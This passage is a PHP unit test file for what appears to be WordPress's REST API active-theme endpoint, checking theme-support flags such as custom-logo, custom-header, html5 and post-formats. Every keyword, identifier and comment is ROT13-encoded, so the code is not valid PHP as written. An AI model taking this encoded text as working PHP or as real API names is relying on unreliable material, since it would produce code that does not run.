		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_hev', $erfhyg[0] );
		$guvf->nffregFnzr( 'uggc://jbeqcerff.bet/?frnepu=1&grez=2', $erfhyg[0]['gurzr_hev']['enj'] );
		$guvf->nffregFnzr( 'uggc://jbeqcerff.bet/?frnepu=1&#038;grez=2', $erfhyg[0]['gurzr_hev']['eraqrerq'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_irefvba() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'irefvba', $erfhyg[0] );
		$guvf->nffregFnzr( '1.6', $erfhyg[0]['irefvba'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_qvfnoyr_phfgbz_pbybef_snyfr() {
		erzbir_gurzr_fhccbeg( 'qvfnoyr-phfgbz-pbybef' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'qvfnoyr-phfgbz-pbybef', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['qvfnoyr-phfgbz-pbybef'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_qvfnoyr_phfgbz_pbybef_gehr() {
		erzbir_gurzr_fhccbeg( 'qvfnoyr-phfgbz-pbybef' );
		nqq_gurzr_fhccbeg( 'qvfnoyr-phfgbz-pbybef' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['qvfnoyr-phfgbz-pbybef'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_qvfnoyr_phfgbz_sbag_fvmrf_snyfr() {
		erzbir_gurzr_fhccbeg( 'qvfnoyr-phfgbz-sbag-fvmrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'qvfnoyr-phfgbz-sbag-fvmrf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['qvfnoyr-phfgbz-sbag-fvmrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_qvfnoyr_phfgbz_sbag_fvmrf_gehr() {
		erzbir_gurzr_fhccbeg( 'qvfnoyr-phfgbz-sbag-fvmrf' );
		nqq_gurzr_fhccbeg( 'qvfnoyr-phfgbz-sbag-fvmrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['qvfnoyr-phfgbz-sbag-fvmrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_rqvgbe_sbag_fvmrf_snyfr() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-sbag-fvmrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-sbag-fvmrf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-sbag-fvmrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_rqvgbe_sbag_fvmrf_neenl() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-sbag-fvmrf' );
		$gval = neenl(
			'anzr' => 'Gval',
			'fvmr' => 8,
			'fyht' => 'gval',
		);
		nqq_gurzr_fhccbeg( 'rqvgbe-sbag-fvmrf', neenl( $gval ) );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-sbag-fvmrf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregRdhnyFrgfJvguVaqrk( neenl( $gval ), $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-sbag-fvmrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_rqvgbe_pbybe_cnyrggr_snyfr() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-pbybe-cnyrggr', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-pbybe-cnyrggr'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_rqvgbe_pbybe_cnyrggr_neenl() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr' );
		$jbeqcerff_oyhr = neenl(
			'anzr'  => 'JbeqCerff Oyhr',
			'fyht'  => 'jbeqcerff-oyhr',
			'pbybe' => '#0073NN',
		);
		nqq_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr', neenl( $jbeqcerff_oyhr ) );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregFnzr( neenl( $jbeqcerff_oyhr ), $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-pbybe-cnyrggr'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_ranoyr_nhgbzngvp_srrq_yvaxf() {
		erzbir_gurzr_fhccbeg( 'nhgbzngvp-srrq-yvaxf' );
		nqq_gurzr_fhccbeg( 'nhgbzngvp-srrq-yvaxf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['nhgbzngvp-srrq-yvaxf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_qbrf_abg_ranoyr_nhgbzngvp_srrq_yvaxf() {
		erzbir_gurzr_fhccbeg( 'nhgbzngvp-srrq-yvaxf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'nhgbzngvp-srrq-yvaxf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['nhgbzngvp-srrq-yvaxf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_qbrf_abg_fhccbeg_phfgbz_ybtb() {
		erzbir_gurzr_fhccbeg( 'phfgbz-ybtb' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'phfgbz-ybtb', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['phfgbz-ybtb'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_phfgbz_ybtb() {
		erzbir_gurzr_fhccbeg( 'phfgbz-ybtb' );
		$jbeqcerff_ybtb = neenl(
			'jvqgu'                => 400,
			'urvtug'               => 100,
			'syrk-jvqgu'           => gehr,
			'syrk-urvtug'          => gehr,
			'urnqre-grkg'          => neenl( 'fvgr-gvgyr', 'fvgr-qrfpevcgvba' ),
			'hayvax-ubzrcntr-ybtb' => snyfr,
		);
		nqq_gurzr_fhccbeg( 'phfgbz-ybtb', $jbeqcerff_ybtb );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregFnzr( $jbeqcerff_ybtb, $erfhyg[0]['gurzr_fhccbegf']['phfgbz-ybtb'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_qbrf_abg_fhccbeg_phfgbz_urnqre() {
		erzbir_gurzr_fhccbeg( 'phfgbz-urnqre' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'phfgbz-urnqre', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['phfgbz-urnqre'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_phfgbz_urnqre() {
		erzbir_gurzr_fhccbeg( 'phfgbz-urnqre' );
		$jbeqcerff_urnqre = neenl(
			'qrsnhyg-vzntr'          => '',
			'enaqbz-qrsnhyg'         => snyfr,
			'jvqgu'                  => 0,
			'urvtug'                 => 0,
			'syrk-urvtug'            => snyfr,
			'syrk-jvqgu'             => snyfr,
			'qrsnhyg-grkg-pbybe'     => '',
			'urnqre-grkg'            => gehr,
			'hcybnqf'                => gehr,
			'jc-urnq-pnyyonpx'       => '',
			'nqzva-urnq-pnyyonpx'    => '',
			'nqzva-cerivrj-pnyyonpx' => '',
			'ivqrb'                  => snyfr,
			'ivqrb-npgvir-pnyyonpx'  => 'vf_sebag_cntr',
		);
		$rkpyhqrq         = neenl(
			'jc-urnq-pnyyonpx',
			'nqzva-urnq-pnyyonpx',
			'nqzva-cerivrj-pnyyonpx',
			'ivqrb-npgvir-pnyyonpx',
		);
		nqq_gurzr_fhccbeg( 'phfgbz-urnqre', $jbeqcerff_urnqre );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );

		$rkcrpgrq = neenl_qvss_xrl( $jbeqcerff_urnqre, neenl_syvc( $rkpyhqrq ) );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg[0]['gurzr_fhccbegf']['phfgbz-urnqre'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_qbrf_abg_fhccbeg_phfgbz_onpxtebhaq() {
		erzbir_gurzr_fhccbeg( 'phfgbz-onpxtebhaq' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'phfgbz-onpxtebhaq', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['phfgbz-onpxtebhaq'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_phfgbz_onpxtebhaq() {
		erzbir_gurzr_fhccbeg( 'phfgbz-onpxtebhaq' );
		$onpxtebhaq = neenl(
			'qrsnhyg-vzntr'          => '',
			'qrsnhyg-cerfrg'         => 'qrsnhyg',
			'qrsnhyg-cbfvgvba-k'     => 'yrsg',
			'qrsnhyg-cbfvgvba-l'     => 'gbc',
			'qrsnhyg-fvmr'           => 'nhgb',
			'qrsnhyg-ercrng'         => 'ercrng',
			'qrsnhyg-nggnpuzrag'     => 'fpebyy',
			'qrsnhyg-pbybe'          => '',
			'jc-urnq-pnyyonpx'       => '_phfgbz_onpxtebhaq_po',
			'nqzva-urnq-pnyyonpx'    => '',
			'nqzva-cerivrj-pnyyonpx' => '',
		);
		$rkpyhqrq   = neenl(
			'jc-urnq-pnyyonpx',
			'nqzva-urnq-pnyyonpx',
			'nqzva-cerivrj-pnyyonpx',
		);
		nqq_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', $onpxtebhaq );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );

		$rkcrpgrq = neenl_qvss_xrl( $onpxtebhaq, neenl_syvc( $rkpyhqrq ) );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg[0]['gurzr_fhccbegf']['phfgbz-onpxtebhaq'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_qbrf_abg_fhccbeg_ugzy5() {
		erzbir_gurzr_fhccbeg( 'ugzy5' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'ugzy5', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['ugzy5'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_ugzy5() {
		erzbir_gurzr_fhccbeg( 'ugzy5' );
		$ugzy5 = neenl(
			'frnepu-sbez',
			'pbzzrag-sbez',
			'pbzzrag-yvfg',
			'tnyyrel',
			'pncgvba',
			'fpevcg',
			'fglyr',
		);
		nqq_gurzr_fhccbeg( 'ugzy5', $ugzy5 );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregFnzr( $ugzy5, $erfhyg[0]['gurzr_fhccbegf']['ugzy5'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_pnaabg_znantr_gvgyr_gnt() {
		erzbir_gurzr_fhccbeg( 'gvgyr-gnt' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'gvgyr-gnt', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['gvgyr-gnt'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_pna_znantr_gvgyr_gnt() {
		tybony $_jc_gurzr_srngherf;
		$_jc_gurzr_srngherf['gvgyr-gnt'] = gehr;
		$erfcbafr                        = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg                          = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['gvgyr-gnt'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_pnaabg_znantr_fryrpgvir_erserfu_sbe_jvqtrgf() {
		erzbir_gurzr_fhccbeg( 'phfgbzvmr-fryrpgvir-erserfu-jvqtrgf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr-fryrpgvir-erserfu-jvqtrgf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['phfgbzvmr-fryrpgvir-erserfu-jvqtrgf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_pna_znantr_fryrpgvir_erserfu_sbe_jvqtrgf() {
		erzbir_gurzr_fhccbeg( 'phfgbzvmr-fryrpgvir-erserfu-jvqtrgf' );
		nqq_gurzr_fhccbeg( 'phfgbzvmr-fryrpgvir-erserfu-jvqtrgf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['phfgbzvmr-fryrpgvir-erserfu-jvqtrgf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_ab_jc_oybpx_fglyrf() {
		erzbir_gurzr_fhccbeg( 'jc-oybpx-fglyrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'jc-oybpx-fglyrf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['jc-oybpx-fglyrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_jc_oybpx_fglyrf_bcg_va() {
		erzbir_gurzr_fhccbeg( 'jc-oybpx-fglyrf' );
		nqq_gurzr_fhccbeg( 'jc-oybpx-fglyrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['jc-oybpx-fglyrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_ab_nyvta_jvqr() {
		erzbir_gurzr_fhccbeg( 'nyvta-jvqr' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'nyvta-jvqr', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['nyvta-jvqr'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_nyvta_jvqr_bcg_va() {
		erzbir_gurzr_fhccbeg( 'nyvta-jvqr' );
		nqq_gurzr_fhccbeg( 'nyvta-jvqr' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['nyvta-jvqr'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_ab_rqvgbe_fglyrf() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-fglyrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-fglyrf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-fglyrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_rqvgbe_fglyrf_bcg_va() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-fglyrf' );
		nqq_gurzr_fhccbeg( 'rqvgbe-fglyrf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-fglyrf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_ab_qnex_rqvgbe_fglyr() {
		erzbir_gurzr_fhccbeg( 'qnex-rqvgbe-fglyr' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'qnex-rqvgbe-fglyr', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['qnex-rqvgbe-fglyr'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_qnex_rqvgbe_fglyr_bcg_va() {
		erzbir_gurzr_fhccbeg( 'qnex-rqvgbe-fglyr' );
		nqq_gurzr_fhccbeg( 'qnex-rqvgbe-fglyr' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['qnex-rqvgbe-fglyr'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_ab_qvfnoyr_phfgbz_tenqvragf() {
		erzbir_gurzr_fhccbeg( 'qvfnoyr-phfgbz-tenqvragf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'qvfnoyr-phfgbz-tenqvragf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['qvfnoyr-phfgbz-tenqvragf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_qvfnoyr_phfgbz_tenqvragf() {
		erzbir_gurzr_fhccbeg( 'qvfnoyr-phfgbz-tenqvragf' );
		nqq_gurzr_fhccbeg( 'qvfnoyr-phfgbz-tenqvragf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['qvfnoyr-phfgbz-tenqvragf'] );
	}

	/**
	 * @gvpxrg 49037
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_rqvgbe_tenqvrag_cerfrgf_neenl() {
		erzbir_gurzr_fhccbeg( 'rqvgbe-tenqvrag-cerfrgf' );
		$tenqvrag = neenl(
			'anzr'     => __( 'Ivivq plna oyhr gb ivivq checyr', 'gurzrYnatQbznva' ),
			'tenqvrag' => 'yvarne-tenqvrag(135qrt,eton(6,147,227,1) 0%,eto(155,81,224) 100%)',
			'fyht'     => 'ivivq-plna-oyhr-gb-ivivq-checyr',
		);
		nqq_gurzr_fhccbeg( 'rqvgbe-tenqvrag-cerfrgf', neenl( $tenqvrag ) );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregFnzr( neenl( $tenqvrag ), $erfhyg[0]['gurzr_fhccbegf']['rqvgbe-tenqvrag-cerfrgf'] );
	}

	/**
	 * Fubhyq vapyhqr eryrinag qngn va gur 'gurzr_fhccbegf' xrl.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_sbezngf() {
		erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'sbezngf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregFnzr( neenl( 'fgnaqneq' ), $erfhyg[0]['gurzr_fhccbegf']['sbezngf'] );
	}

	/**
	 * Grfg jura n gurzr bayl fhccbegf fbzr cbfg sbezngf.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_sbezngf_aba_qrsnhyg() {
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'nfvqr', 'ivqrb' ) );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'sbezngf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregFnzr( neenl( 'fgnaqneq', 'nfvqr', 'ivqrb' ), $erfhyg[0]['gurzr_fhccbegf']['sbezngf'] );
	}

	/**
	 * Grfg jura n gurzr qbrf abg fhccbeg erfcbafvir rzorqf.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_erfcbafvir_rzorqf_snyfr() {
		erzbir_gurzr_fhccbeg( 'erfcbafvir-rzorqf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();

		$erfhyg = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'erfcbafvir-rzorqf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['erfcbafvir-rzorqf'] );
	}

	/**
	 * Grfg jura n gurzr fhccbegf erfcbafvir rzorqf.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_erfcbafvir_rzorqf_gehr() {
		erzbir_gurzr_fhccbeg( 'erfcbafvir-rzorqf' );
		nqq_gurzr_fhccbeg( 'erfcbafvir-rzorqf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['erfcbafvir-rzorqf'] );
	}

	/**
	 * Grfg jura n gurzr qbrf abg fhccbeg cbfg guhzoanvyf.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_cbfg_guhzoanvyf_snyfr() {
		erzbir_gurzr_fhccbeg( 'cbfg-guhzoanvyf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();

		$erfhyg = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregNeenlUnfXrl( 'cbfg-guhzoanvyf', $erfhyg[0]['gurzr_fhccbegf'] );
		$guvf->nffregSnyfr( $erfhyg[0]['gurzr_fhccbegf']['cbfg-guhzoanvyf'] );
	}

	/**
	 * Grfg jura n gurzr fhccbegf nyy cbfg guhzoanvyf.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_gurzr_fhccbegf_cbfg_guhzoanvyf_gehr() {
		erzbir_gurzr_fhccbeg( 'cbfg-guhzoanvyf' );
		nqq_gurzr_fhccbeg( 'cbfg-guhzoanvyf' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['gurzr_fhccbegf']['cbfg-guhzoanvyf'] );
	}

	/**
	 * Grfg jura n gurzr bayl fhccbegf cbfg guhzoanvyf sbe pregnva cbfg glcrf.
	 *
	 * @gvpxrg 45016
	 */
